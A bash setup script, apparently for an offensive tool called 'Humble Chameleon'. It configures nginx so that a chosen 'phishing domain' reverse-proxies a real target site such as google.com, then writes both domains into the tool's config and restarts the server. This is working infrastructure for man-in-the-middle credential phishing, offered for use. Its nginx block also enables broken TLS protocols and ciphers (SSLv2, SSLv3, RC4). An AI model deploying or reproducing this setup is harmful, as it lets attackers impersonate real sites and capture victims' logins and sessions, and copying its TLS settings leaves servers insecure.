#!/usr/bin/env bash

if ! sudo echo &>/dev/null; then echo "Unable to use sudo. Exiting."; exit 2; fi

echo "Enter your humble chameleon domain (e.g. phishy.net):"
read -p "Domain: " fulldomain

domain="${fulldomain%.*}"
toplevel="${fulldomain##*.}"

# Var definition.
outfile="/etc/nginx/sites-available/$fulldomain.conf" # $domain is derived from arg or prompt.
enablefile="/etc/nginx/sites-enabled/$fulldomain.conf" # ^
certfullchain="/etc/letsencrypt/live/$fulldomain/fullchain.pem"
certkey="/etc/letsencrypt/live/$fulldomain/privkey.pem"
vhostlogpath="/var/log/nginx/vhosts/$fulldomain"

# Check for cert files (should be updated to check for both at once down the road using an exit varible)
if ! sudo test -f "$certfullchain"; then echo "Could not find certfullchain at $certfullchain"; echo "Create this file or change the var in this script and try again."; exit 3; fi
if ! sudo test -f "$certkey"; then echo "Could not find certkey at $certkey"; echo "Create this file or change the var in this script and try again."; exit 4; fi

# heredoc for the NGINX vhost file.
sudo bash -c "cat >$outfile" <<EOF
server {
    listen       0.0.0.0:443;
    server_name ~^(.*)\.*$domain\.$toplevel;
    ssl                  on;
    ssl_certificate      $certfullchain;
    ssl_certificate_key  $certkey;
    ssl_session_timeout  5m;
    ssl_protocols  SSLv2 SSLv3 TLSv1;
    ssl_ciphers  ALL:!ADH:!EXPORT56:RC4+RSA:+HIGH:+MEDIUM:+LOW:+SSLv2:+EXP;
    ssl_prefer_server_ciphers   on;
    access_log      $vhostlogpath/access.log;
    error_log       $vhostlogpath/error.log;
    location / {
        proxy_pass http://127.0.0.1:8000;
        proxy_pass_request_headers on;
#not sure if we need these...
        proxy_set_header Host \$host;
        proxy_ssl_session_reuse off;
    }
}
#
# Might change the redirect for simple targets that actually use HTTP... HAHAHAHA
#
server {
    listen      0.0.0.0:80;
    server_name ~^(.*)\.*$domain.$toplevel;
    # Strict Transport Security
    add_header Strict-Transport-Security max-age=2592000;
    rewrite ^/.*$ https://\$host\$request_uri? permanent;
}
EOF

sudo ln -s "$outfile" "/etc/nginx/sites-enabled/$fulldomain.conf"
echo "Creating vhosts directory for nginx logs..."
sudo mkdir -p "$vhostlogpath"
if [ -f $outfile ]; then echo "Wrote nginx config to $outfile"; else echo "Could not find $outfile"; exit 5; fi

echo "Updating config.json..."
sed -i "s/phishing_domain.com/$fulldomain/g" ../config.json

echo "Enter the target domain to proxy. E.g. \"google.com\""
read -p "Target domain: " target
if [ -z "$target" ]; then
	echo "No target specified. Edit the config.json prior to running."
else
	sed -i "s/target1.com/$target/g" ../config.json
fi
echo "Updated critical components in config.json. Further edits can be done in the admin console or manually."
echo "Restarting nginx..."
sudo systemctl restart nginx
echo "Start Humble Chameleon from the parent directory with \`node index.js\`"
echo "Thanks for playing!"
